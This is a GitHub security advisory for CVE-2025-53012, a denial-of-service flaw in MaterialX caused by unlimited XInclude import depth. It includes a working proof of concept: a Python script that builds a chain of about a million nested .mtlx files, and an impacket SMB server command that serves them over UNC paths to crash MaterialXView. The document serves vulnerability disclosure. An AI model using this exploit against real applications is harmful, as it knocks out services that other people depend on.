# [M] MaterialX Lack of MTLX Import Depth Limit Leads to DoS (Denial-Of-Service) Via Stack Exhaustion

## Summary
Severity: Medium
Advisory: GHSA-qc2h-74x3-4v3w
CVE: CVE-2025-53012
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-07-31
Source: https://github.com/advisories/GHSA-qc2h-74x3-4v3w
Type: github-advisory

## Affected
- PyPI: `MaterialX` — affected >=1.39.2 <1.39.3

## Details
### Summary
Nested imports of MaterialX files can lead to a crash via stack memory exhaustion, due to the lack of a limit on the "import chain" depth.

### Details
The MaterialX [specification](https://github.com/AcademySoftwareFoundation/MaterialX/blob/main/documents/Specification/MaterialX.Specification.md#mtlx-file-format-definition) supports importing other files by using `XInclude` tags.

When parsing file imports, recursion is used to process nested files in the form of a tree with the root node being the first MaterialX files parsed.

However, there is no limit imposed to the depth of files that
can be parsed by the library, therefore, by building a sufficiently deep chain of MaterialX files one referencing the next, it is possible to crash the process using the MaterialX library via stack exhaustion.

### PoC
This test is going to employ Windows UNC paths, in order to make the Proof Of Concept more realistic. In fact, by using windows network shares, an attacker would be able to exploit the vulnerability (in Windows) if they could control the content of a single `.mtlx` file being parsed.

Note that for the sake of simplicity the PoC will use the MaterialXView application to easily reproduce the vulnerability, however it does not affect MaterialXView directly.

In order to reproduce this test, please follow the steps below:

1. Compile or download the MaterialXView application in a Windows machine
2. In a separate Linux machine in the same local network, install the `impacket` package (the documentation of the package suggests using `pipx`, as in `python3 -m pipx install impacket
`). 
3. In the Linux machine, create a file named `template.mtlx` with the following content:
```xml
<?xml version="1.0"?>
<materialx version="1.39" colorspace="lin_rec709">
  <xi:include href="\\\\{ip}\\{name}.mtlx"/>
  <surfacematerial name="Aluminum_Brushed" type="material">
    <input name="surfaceshader" type="surfaceshader" nodename="open_pbr_surface_surfaceshader" />
  </surfacematerial>
  <open_pbr_surface name="open_pbr_surface_surfaceshader" type="surfaceshader">
    <input name="base_color" type="color3" value="0.912, 0.914, 0.920" />
    <input name="base_metalness" type="float" value="1.0" />
    <input name="specular_color" type="color3" value="0.970, 0.979, 0.988" />
    <input name="specular_roughness" type="float" value="0.2" />
    <input name="specular_roughness_anisotropy" type="float" value="0.9" />
  </open_pbr_surface>
</materialx>
```
4. In the same directory, create a file named `script.py` with the following content:
```python
import argparse
import uuid
import os
from pathlib import Path

MAX_FILES_PER_DIR = 1024
MAX_DIRECTORIES = 1024

def uuid_generator(count):
    for _ in range(count):
        yield str(uuid.uuid4())

def get_dir_and_file_count(total_files):
    num_dirs = (total_files + MAX_FILES_PER_DIR - 1) // MAX_FILES_PER_DIR
    if num_dirs > MAX_DIRECTORIES:
        raise ValueError(f"Too many files requested. Maximum is {MAX_FILES_PER_DIR * MAX_DIRECTORIES}")
    return num_dirs

def create_materialx_chain(template_path, output_dir, ip_address, share_name, num_iterations):
    with open(template_path, 'r') as f:
        template_content = f.read()
    
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    
    dir_count = get_dir_and_file_count(num_iterations)
    dir_uuids = [str(uuid.uuid4()) for _ in range(dir_count)]
    
    for dir_uuid in dir_uuids:
        Path(os.path.join(output_dir, dir_uuid)).mkdir(exist_ok=True)
    
    uuid_gen = uuid_generator(num_iterations)
    next_uuid = next(uuid_gen)
    first_file_path = None

    for i in range(num_iterations):
        current_uuid = next_uuid
        next_uuid = next(uuid_gen) if i < num_iterations - 1 else "FINAL"
        
        dir_index = i // MAX_FILES_PER_DIR
        dir_uuid = dir_uuids[dir_index]
        
        if next_uuid != "FINAL":
            next_dir_index = (i + 1) // MAX_FILES_PER_DIR
            next_dir_uuid = dir_uuids[next_dir_index]
            include_path = f"{share_name}\\{next_dir_uuid}\\{next_uuid}"
        else:
            include_path = next_uuid
        
        content = template_content.replace("{ip}", ip_address)
        content = content.replace("{name}", include_path)
        
        output_path = os.path.join(output_dir, dir_uuid, f"{current_uuid}.mtlx")
        with open(output_path, 'w') as f:
            f.write(content)

        if i == 0:
            first_file_path = f"\\\\{ip_address}\\{share_name}\\{dir_uuid}\\{current_uuid}.mtlx"
            print(f"First file created at UNC path: {first_file_path}")

def main():
    parser = argparse.ArgumentParser(description='Generate chain of MaterialX files')
    parser.add_argument('template', help='Path to template MaterialX file')
    parser.add_argument('output_dir', help='Output directory for generated files')
    parser.add_argument('ip_address', help='IP address to use in file paths')
    parser.add_argument('share_name', help='Share name to use in file paths')
    parser.add_argument('--iterations', type=int, default=10,
                      help='Number of files to generate (default: 10)')
    
    args = parser.parse_args()
    
    if args.iterations > MAX_FILES_PER_DIR * MAX_DIRECTORIES:
        print(f"Error: Maximum number of files is {MAX_FILES_PER_DIR * MAX_DIRECTORIES}")
        return
    
    create_materialx_chain(
        args.template,
        args.output_dir,
        args.ip_address,
        args.share_name,
        args.iterations
    )

if __name__ == "__main__":
    main()
```
5. Run the python script with the following command line, replacing the `$IP` placeholder with the IP address of your interface (the command will take some time to execute): `python3 script.py --iterations 1048576 template.mtlx chain $IP chain`
    - This will print, in the console, a line documenting the UNC path of the first file of the chain. Copy that path in the clipboard.
6. Spawn the SMB server by executing the following command line: `pipx run --spec impacket smbserver.py -smb2support chain chain/`
7. In the Windows machine, create a MaterialX file with the following content, replacing the `$UNCPATH` placeholder with the content of the path printed at step 5:
```
<?xml version="1.0"?>
<materialx version="1.39" colorspace="lin_rec709">
  <xi:include href="$UNCPATH"/>
  <surfacematerial name="Aluminum_Brushed" type="material">
    <input name="surfaceshader" type="surfaceshader" nodename="open_pbr_surface_surfaceshader" />
  </surfacematerial>
  <open_pbr_surface name="open_pbr_surface_surfaceshader" type="surfaceshader">
    <input name="base_color" type="color3" value="0.912, 0.914, 0.920" />
    <input name="base_metalness" type="float" value="1.0" />
    <input name="specular_color" type="color3" value="0.970, 0.979, 0.988" />
    <input name="specular_roughness" type="float" value="0.2" />
    <input name="specular_roughness_anisotropy" type="float" value="0.9" />
  </open_pbr_surface>
</materialx>
```
8. Load the MaterialX file in MaterialXView
9. Notice that the viewer doesn't respond anymore. After some minutes, notice that the viewer crashes, demonstrating the Stack Exhaustion

Note: by consulting the Windows `Event Viewer`, it is possible to examine the application crash, verifying that it is indeed crashing with a `STATUS_STACK_OVERFLOW (0xc00000fd)`.

### Impact

An attacker exploiting this vulnerability would be able to intentionally stall and crash an application reading MaterialX files controlled by them.

In Windows, the attack complexity is lower, since the malicious MaterialX file can reference remote paths via the UNC notation. However, the attack would work in other systems as well, provided that the attacker can write an arbitrary amount of MaterialX files (implementing the chain) in the local file system.

## References
- https://github.com/AcademySoftwareFoundation/MaterialX/security/advisories/GHSA-qc2h-74x3-4v3w
- https://nvd.nist.gov/vuln/detail/CVE-2025-53012
- https://github.com/AcademySoftwareFoundation/MaterialX/pull/2233/commits/6182c07467297416a30d148ab531d81198686dc5
- https://github.com/AcademySoftwareFoundation/MaterialX
- https://github.com/AcademySoftwareFoundation/MaterialX/blob/main/documents/Specification/MaterialX.Specification.md#mtlx-file-format-definition
- https://github.com/AcademySoftwareFoundation/MaterialX/releases/tag/v1.39.3
